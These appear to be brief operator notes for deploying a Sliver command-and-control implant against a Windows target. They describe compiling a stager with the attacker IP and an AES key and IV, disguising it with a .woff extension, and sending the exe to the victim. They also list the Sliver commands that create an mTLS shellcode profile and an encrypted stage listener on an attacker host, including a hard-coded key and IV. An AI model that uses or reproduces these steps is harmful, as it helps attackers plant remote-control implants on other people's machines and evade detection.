compile this stager with attacker ip and AES key and iv with extension whatever.woff

the exe generated from this will be send to the target windows machine



----

sliver server steps



start sliver server

sudo systemctl start sliver

create profile => profiles new --mtls 192.168.122.1 --format shellcode <profile name>

create mtls listener  =>  mtls

create stage listener => stage-listener --url http://<attacker ip>:<listener port> --profile win-shellcode --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV

use a different port from the other listener. mtls defaults to port 8888

